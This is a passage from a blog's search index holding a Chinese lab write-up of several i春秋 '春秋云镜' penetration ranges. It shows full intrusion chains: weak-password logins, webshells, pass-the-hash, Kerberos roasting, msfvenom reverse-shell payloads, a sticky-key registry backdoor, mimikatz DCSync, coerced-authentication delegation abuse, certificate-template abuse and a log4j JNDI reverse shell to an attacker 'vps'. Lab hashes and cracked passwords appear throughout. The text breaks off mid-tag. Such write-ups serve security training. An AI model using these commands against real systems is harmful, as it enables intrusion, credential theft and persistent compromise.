<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>春秋云镜</title>
    <link href="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    <url>/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="i春秋"><a href="#i春秋" class="headerlink" title="i春秋"></a>i春秋</h1><h2 id="网鼎杯半决"><a href="#网鼎杯半决" class="headerlink" title="网鼎杯半决"></a>网鼎杯半决</h2><p>上fscan 发现wordpress</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104154012454.png" alt="image-20241104154012454"></p><p>wordpress 这里直接去找登录口 弱口令admin&#x2F;123456就登录上去了</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104154154480.png" alt="image-20241104154154480"></p><p>主题写马</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104154739132.png" alt="image-20241104154739132"></p><p>连shell 根目录拿flag01（shell路径：wordpress 主题一般在&#x2F;wp-content&#x2F;themes&#x2F;下 拼接一下访问这个页面的url）</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104154859953.png" alt="image-20241104154859953"></p><p>查网卡 上fscan </p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104155117253.png" alt="image-20241104155117253"></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104155534295.png" alt="image-20241104155534295"></p><p>掏出最喜欢的venom+proxifier<img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104155838233.png" alt="image-20241104155838233"></p><p>先去打MS17-010 172.22.15.24</p><p>给kali配上proxychains4</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104160913867.png" alt="image-20241104160913867"></p><p>永恒之蓝好卡…</p><p>由于太卡了，hashdump下来再用哈希连接主机</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104161634833.png" alt="image-20241104161634833"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> psexec.py administrator@<span class="hljs-number">172.22.15.24</span> -hashes <span class="hljs-string">&quot;:0e52d03e9b939997401466a0ec5a9cbc&quot;</span> -codec gbk<br></code></pre></td></tr></table></figure><p>也可以使用CME</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104162919563.png" alt="image-20241104162919563"></p><p>这里找flag可以用</p><p>findstr &#x2F;m &#x2F;i &#x2F;s “flag” *.txt</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104162530496.png" alt="image-20241104162530496"></p><p>同样是单网卡主机 但是看到有phpstudy_pro,建立了新用户但是连接不上去<img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104163118993.png" alt="image-20241104163118993"></p><p>回到<a href="http://172.22.15.24/%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%BC%B1%E5%8F%A3%E4%BB%A4">http://172.22.15.24/，又是一个弱口令</a></p><p>后台管理找到用户名</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104164036051.png" alt="image-20241104164036051"></p><p>生成一个字典</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104164222483.png" alt="image-20241104164222483"></p><p>想到AS-REP ROASTING </p><p>GetNPUsers得到lixiuying和huachunmei未开启预认证</p><p>（这个工具需要指明域控ip，域名称后面要写&#x2F;）</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241104164606565.png" alt="image-20241104164606565"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">hashcat -m <span class="hljs-number">18200</span> <span class="hljs-symbol">&#x27;hash</span>&#x27; 字典 <span class="hljs-comment">--force</span><br></code></pre></td></tr></table></figure><p><a href="mailto:&#108;&#105;&#120;&#x69;&#x75;&#x79;&#x69;&#110;&#103;&#x40;&#120;&#x69;&#97;&#111;&#114;&#x61;&#x6e;&#103;&#x2e;&#108;&#x61;&#98;">&#108;&#105;&#120;&#x69;&#x75;&#x79;&#x69;&#110;&#103;&#x40;&#120;&#x69;&#97;&#111;&#114;&#x61;&#x6e;&#103;&#x2e;&#108;&#x61;&#98;</a>&#x2F;winniethepooh</p><p><a href="mailto:&#x68;&#117;&#97;&#x63;&#x68;&#117;&#110;&#x6d;&#101;&#105;&#x40;&#120;&#x69;&#x61;&#x6f;&#x72;&#x61;&#x6e;&#x67;&#x2e;&#108;&#x61;&#x62;">&#x68;&#117;&#97;&#x63;&#x68;&#117;&#110;&#x6d;&#101;&#105;&#x40;&#120;&#x69;&#x61;&#x6f;&#x72;&#x61;&#x6e;&#x67;&#x2e;&#108;&#x61;&#x62;</a>&#x2F;1qaz2wsx</p><p>使用密码去RDP登录另一台域内的主机(172.22.15.35)</p><p>可惜机子上找不到flag </p><p>上bloodhound找攻击路径</p><h2 id="TSclient"><a href="#TSclient" class="headerlink" title="TSclient"></a>TSclient</h2><p>一开始fscan扫到了iis和mssql，mssql试了弱口令检查工具和weekpass都没扫通，后面直接去看wp，我的服务字典太弱了</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241105221546610.png" alt="image-20241105221546610"></p><p>用template执行命令成功</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241105221730360.png" alt="image-20241105221730360"></p><p>这里直接用MDUT传马</p><p>记一下msf命令 服务器上一直生成不了 改用了cs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">msfvenom -p windows/meterpreter_reverse_tcp lhost=ip lport=4444 -f elf &gt; 1<br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241105233312172.png" alt="image-20241105233312172"></p><p>（由于是iis环境 查看特权）</p><p>whoami &#x2F;priv发现敏感特权，尝试土豆家族提权</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241105233722116.png" alt="image-20241105233722116"></p><p>cs梼杌插件一个一个试 成功提权</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241105234232450.png" alt="image-20241105234232450"></p><h2 id="Delegation（ok）"><a href="#Delegation（ok）" class="headerlink" title="Delegation（ok）"></a>Delegation（ok）</h2><p>开局一个cmseasy，直接搜nday找到后台admin&#x2F;123456登入</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106152541460.png" alt="image-20241106152541460"></p><p>在系统模板的地方发现了php代码，尝试往模板加php代码但是把环境橄榄了</p><p>尝试其他nday</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106154340082.png" alt="image-20241106154340082"></p><p><a href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Egetshell">CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞 | jdr</a></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106154304912.png" alt="image-20241106154304912"></p><p>上来单网卡主机 上fscan扫</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106154525954.png" alt="image-20241106154525954"></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106154816517.png"></p><p>整理一下结果172.22.4.7（域控） 19 （文件服务）36（入口） 45（IIS） 四台机子，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 bloodhound-python.py -u <span class="hljs-built_in">test</span> -p <span class="hljs-built_in">test</span>@123 -d xiaorang.lab -ns 172.22.4.7 -c All<br></code></pre></td></tr></table></figure><p>&#x2F;home&#x2F;flag01需要提权，尝试sudo和suid</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106154711002.png" alt="image-20241106154711002"></p><p>存在diff 利用diff读取flag</p><p><a href="https://gtfobins.github.io/gtfobins/diff/">diff | GTFOBins</a></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106160048042.png" alt="image-20241106160048042"></p><p>搭建代理</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106155308552.png" alt="image-20241106155308552"></p><p>根据上面的提示</p><p>172.22.4.45的Adrian密码可以用rockyou爆破</p><p>crackmapexec爆破密码（有点慢 下次用hydra windows的爆破工具总是卡死）</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106161717224.png" alt="image-20241106161717224"></p><p>爆出来密码过期</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106162034858.png" alt="image-20241106162034858"></p><p>网上学到rdesktop使用</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106162336215.png" alt="image-20241106162336215"></p><p>应该又需要提权，桌面找到一个privesc文件夹，注意到一个high</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106163100313.png" alt="image-20241106163100313"></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106163400628.png" alt="image-20241106163400628"></p><p>certutil上传不了cs生成的服务马，但是使用rdesktop参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">-r sound<span class="hljs-keyword">:local</span> -r disk:<span class="hljs-attribute">LinuxPictures</span>=/home/kali/Desktop<br></code></pre></td></tr></table></figure><p>成功共享（nb！）</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">服务修改<br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot;</span> /v ImagePath /t REG_EXPAND_SZ /d <span class="hljs-string">&quot;C:\Users\Adrian\Desktop\a.exe&quot;</span> /f</span><br>服务启动<br>sc start gupdate<br></code></pre></td></tr></table></figure><p>以上一直使用cs没成功，后来选择粘滞键后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cobol">msfvenom -p windows/x64/exec cmd=&quot;C:\windows\system32\cmd.exe /c C:\Users\Adrian\Desktop\shift.bat&quot; --platform windows -f exe-service &gt; evil.exe<br>建立shift.bat<br>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;<br></code></pre></td></tr></table></figure><p><strong>锁定用户</strong>后激活粘纸键，添加管理员</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106220635060.png" alt="image-20241106220635060"></p><p>拿下flag2</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106220826529.png" alt="image-20241106220826529"></p><p>出于权限 上传sharphound后使用粘滞后门执行脚本，由于不是域管，bloodhound.py也不能执行</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106221721685.png" alt="image-20241106221721685"></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpassword抓密码<br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106223542866.png" alt="image-20241106223542866"></p><p>967b3bb068e0915336fff02bf1eaa71d</p><p>发现一个服务用户，bloodhound发现win19开启非约束委派</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106225005399.png" alt="image-20241106225005399"></p><p>这里用到rubeus+dfscoerce，非约束委派在这里指的是域控通过kerberos去连接开启了非约束委派的机器上的服务，这个服务又被攻击者监听，TGT就被截取了，同时非约束委派导致TGT可以被利用</p><p><a href="https://cloud.tencent.com/developer/article/1899592">域渗透之委派攻击详解（非约束委派&#x2F;约束委派&#x2F;资源委派）-腾讯云开发者社区-腾讯云</a></p><p>刚想说有点像NTLM RELAY利用打印机截取，就看到约束委派也可以利用打印机漏洞</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241106234043842.png" alt="image-20241106234043842"></p><p>roxychains4 -q python3 dfscoerce.py -u “WIN19$” -hashes :967b3bb068e0915336fff02bf1eaa71d -d xiaorang.lab -dc-ip 172.22.4.7 “WIN19” 172.22.4.7</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107000147043.png" alt="image-20241107000147043"></p><p>“Rubeus (2).exe” ptt &#x2F;ticket:刚刚获取的票据成功获得权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; exit<br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107000530691.png" alt="image-20241107000530691"></p><p>剩下两台机子都通过PTH拿到flag</p><p>python3 psexec.py xiaorang&#x2F;<a href="mailto:&#x41;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#x72;&#x61;&#116;&#111;&#114;&#x40;&#49;&#55;&#x32;&#46;&#50;&#x32;&#46;&#x34;&#46;&#x31;&#57;">&#x41;&#x64;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#x72;&#x61;&#116;&#111;&#114;&#x40;&#49;&#55;&#x32;&#46;&#50;&#x32;&#46;&#x34;&#46;&#x31;&#57;</a> -hashes :4889f6553239ace1f7c47fa2c619c252 -codec gbk</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107001201646.png" alt="image-20241107001201646"></p><h2 id="Hospital（ok）"><a href="#Hospital（ok）" class="headerlink" title="Hospital（ok）"></a>Hospital（ok）</h2><p>fscan扫到headdump泄露</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107141340678.png" alt="image-20241107141340678"></p><p>访问heapdump下载内存转储文件</p><p>iwannagetall解密 找到shirokey</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107142152004.png" alt="image-20241107142152004"></p><p>冰蝎成功连接</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107143034770.png" alt="image-20241107143034770"></p><p>这里先修复了一下xshell的问题</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107145908508.png" alt="image-20241107145908508"></p><p>这里用vim 直接去读&#x2F;root&#x2F;flag&#x2F;flag01.txt</p><p>fscan结果</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107150831524.png" alt="image-20241107150831524"></p><p>发现还有一个236 一个 6存在 nacos漏洞</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107151420868.png" alt="image-20241107151420868"></p><p>抓包 改ua头 </p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107151619059.png" alt="image-20241107151619059"></p><p>demo&#x2F;demo<img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107151653157.png" alt="image-20241107151653157"></p><p>找到配置文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span><br>  <span class="hljs-attr">servlet:</span><br>    <span class="hljs-attr">context-path:</span> <span class="hljs-string">/hello</span><br><br><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">application:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">db-config</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">nacos:</span><br>      <span class="hljs-attr">discovery:</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span><br>      <span class="hljs-attr">config:</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span><br>        <span class="hljs-attr">file-extension:</span> <span class="hljs-string">yaml</span><br>        <span class="hljs-attr">namespace:</span> <span class="hljs-string">dev</span><br>        <span class="hljs-attr">group:</span> <span class="hljs-string">DEFAULT_GROUP</span><br>        <span class="hljs-attr">data-id:</span> <span class="hljs-string">db-config.yaml</span><br>  <span class="hljs-attr">datasource:</span><br>    <span class="hljs-attr">mysql:</span><br>      <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC&amp;allowPublicKeyRetrieval=true</span><br>      <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>      <span class="hljs-attr">password:</span> <span class="hljs-string">P@ssWord!!!</span><br>  <span class="hljs-attr">redis:</span><br>    <span class="hljs-attr">host:</span> <span class="hljs-string">localhost</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">6379</span><br><br><span class="hljs-attr">management:</span><br>  <span class="hljs-attr">endpoints:</span><br>    <span class="hljs-attr">web:</span><br>      <span class="hljs-attr">exposure:</span><br>        <span class="hljs-attr">include:</span> <span class="hljs-string">&#x27;*&#x27;</span><br><br></code></pre></td></tr></table></figure><p>对于nacos后台 可以尝试写入内存马或者打yaml</p><p><a href="https://h0ny.github.io/posts/Nacos-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">Nacos 漏洞利用总结 | h0ny’s blog</a></p><p><a href="https://github.com/artsploit/yaml-payload">artsploit&#x2F;yaml-payload: A tiny project for generating SnakeYAML deserialization payloads</a></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107152256502.png" alt="image-20241107152256502"></p><p>由于机器不出网 web01有python 这里可以python开服务器然后让nacos去连接恶意jar包</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107154831851.png" alt="image-20241107154831851"></p><p>rdp连上去拿flag2</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107155054216.png" alt="image-20241107155054216"></p><p>由于是组环境 直接访问236的web服务</p><p>登录框 跑了一会儿弱口令，报错发现fastjson</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107160515386.png" alt="image-20241107160515386"></p><p>{“@type”: “java.lang.AutoCloseable” 获取到版本号</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107160613580.png" alt="image-20241107160613580"></p><p>fastjsonscan梭哈</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241107161804822.png" alt="image-20241107161804822"></p><h2 id="Certify-（ok）"><a href="#Certify-（ok）" class="headerlink" title="Certify （ok）"></a>Certify （ok）</h2><p>fscan扫到 solar 版本较高很多poc没打通</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108101011057.png" alt="image-20241108101011057"></p><p>发现使用了log4j</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108101942345.png" alt="image-20241108101942345"></p><p>bp插件触发</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108101829908.png" alt="image-20241108101829908"></p><p>开启恶意服务器和监听</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108102204726.png" alt="image-20241108102204726"></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108102404739.png" alt="image-20241108102404739"></p><p>在靶机上执行</p><p>{jndi:ldap:&#x2F;&#x2F;vps:1389&#x2F;Basic&#x2F;ReverseShell&#x2F;vps&#x2F;port}</p><p>收到shell之后sudo -l发现grc有权限</p><p>pty敏感参数</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108103306212.png" alt="image-20241108103306212"></p><p>gtfobins找到提权</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108103400973.png" alt="image-20241108103400973"></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108103444009.png" alt="image-20241108103444009"></p><p>查网段，准备上fscan和venom</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108103504048.png" alt="image-20241108103504048"></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108103935545.png" alt="image-20241108103935545"></p><p>整理一下结果</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108104255270.png" alt="image-20241108104255270"></p><p>172.22.9段  </p><p>7（IIS域控） </p><p>19（入口） </p><p>26 （域成员）</p><p>47（apache ubuntu2 开了ftp服务）</p><p>先尝试ftp</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108105126638.png" alt="image-20241108105126638"></p><p>找到flag02，把所有文件一个个get下来</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108105323711.png" alt="image-20241108105323711"></p><p>flag中提示spn，使用Getuserspn</p><p>配合前面拿到的db</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108105741353.png" alt="image-20241108105741353"></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108105825733.png" alt="image-20241108105825733"></p><p>windows下的工具走不通代理 使用hydra</p><p>先尝试域成员机器</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">└─<span class="hljs-meta"># proxychains4 -q hydra -L <span class="hljs-string">&quot;/home/kali/1.txt&quot;</span> -P <span class="hljs-string">&quot;/home/kali/2.txt&quot;</span> 172.22.9.26 rdp -vV </span><br></code></pre></td></tr></table></figure><p>得到账号密码 但是没有权限登录rdp</p><p>zhangjian–i9XDE02pLVf<br>liupeng–fiAzGwEMgTY</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> python3 GetUserSPNs.py -request -dc-ip <span class="hljs-number">172.22.9.7</span> xiaorang.lab/zhangjian<br></code></pre></td></tr></table></figure><p>得到TGS-REP hash</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">└─# hashcat -m <span class="hljs-number">13100</span> -a <span class="hljs-number">0</span> --force hash.txt <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></td></tr></table></figure><p>得到zhangjian&#x2F;MyPass2@@6</p><p>chenchen&#x2F;@Passw0rd@</p><p>！注意 登录名称加上@域名</p><p>登录后用户权限不足访问文件夹，根据靶场名称使用certipy</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> certipy find -u <span class="hljs-string">&#x27;zhangxia<span class="hljs-variable">@xiaorang</span>.lab&#x27;</span>  -password <span class="hljs-string">&#x27;MyPass2@@6&#x27;</span> -dc-ip <span class="hljs-number">172.22.9.7</span> -vulnerable -stdout<br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108113617951.png" alt="image-20241108113617951"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> certipy req -u <span class="hljs-string">&#x27;zhangjian<span class="hljs-variable">@xiaorang</span>.lab&#x27;</span> -p <span class="hljs-string">&#x27;i9XDE02pLVf&#x27;</span> -target <span class="hljs-number">172.22.9.7</span> -dc-ip <span class="hljs-number">172.22.9.7</span> -ca <span class="hljs-string">&quot;xiaorang-XIAORANG-DC-CA&quot;</span> -template <span class="hljs-string">&#x27;XR Manager&#x27;</span>  -upn administrator<span class="hljs-variable">@xiaorang</span>.lab<br><br>proxychains4 certipy auth -pfx administrator.pfx -dc-ip <span class="hljs-number">172.22.9.7</span><br></code></pre></td></tr></table></figure><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241108113550386.png" alt="image-20241108113550386"></p><p>剩下两台主机横向即可，推荐psexec等可以交互的 SMB不太好</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> crackmapexec smb <span class="hljs-number">172.22.9.7</span> -u administrator -H aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">2</span>f1b57eefb2d152196836b0516abea80 -d xiaorang.lab<br></code></pre></td></tr></table></figure><h2 id="ThermalPower-（ok）"><a href="#ThermalPower-（ok）" class="headerlink" title="ThermalPower （ok）"></a>ThermalPower （ok）</h2><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241112151857463.png" alt="image-20241112151857463"></p><p>扫出来heapdump泄露 访问&#x2F;actuator&#x2F;heapdump直接下载下</p><p>解密出来shirokey</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241112152027355.png" alt="image-20241112152027355"></p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241112152527136.png" alt="image-20241112152527136"></p><p>172.22.17段  发现另一台.6的机子，存在ftp匿名访问</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241112152930939.png" alt="image-20241112152930939"></p><p>把文件都拉下来</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241112153224439.png" alt="image-20241112153224439"></p><p>同时有大量账号 做一下拼接</p><p><img src="/2025/01/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20241112153255276.png" alt="image-20241112153255276"></p><p>给出的管理员是22段的，后面再用，先进行smb爆破</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span 